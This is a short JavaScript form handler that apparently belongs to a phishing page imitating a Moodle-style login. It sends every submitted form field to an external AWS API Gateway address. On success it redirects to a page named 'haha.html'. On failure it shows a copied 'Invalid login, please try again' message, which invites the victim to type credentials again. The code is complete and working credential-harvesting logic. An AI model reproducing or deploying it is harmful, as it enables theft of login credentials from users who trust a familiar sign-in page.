const form = document.getElementById('comp-form');

const ha = document.getElementById('hidden-alert');

form.addEventListener('submit', function(e) {
   e.preventDefault();

   const payload = new FormData(form) // makes array of arrays
   // console.log(...payload)

   fetch('https://ggdm340m97.execute-api.eu-central-1.amazonaws.com/post', {
      method: "POST",
      body: payload,
   })
   .then(res => {
      console.log("result: ", res)
      if (res.status === 200) {
         // console.log("WOOOW")
         location.replace("./haha.html");
      } else {
         // console.log("invalid")
         ha.innerHTML = "<a href='#''loginerrormessage' class='accesshide'>Invalid login, please try again</a><div class='alert alert-danger' role='alert' data-aria-autofocus='true'>Invalid login, please try again</div>";
      }
   })
   .catch(err => console.log(err));
})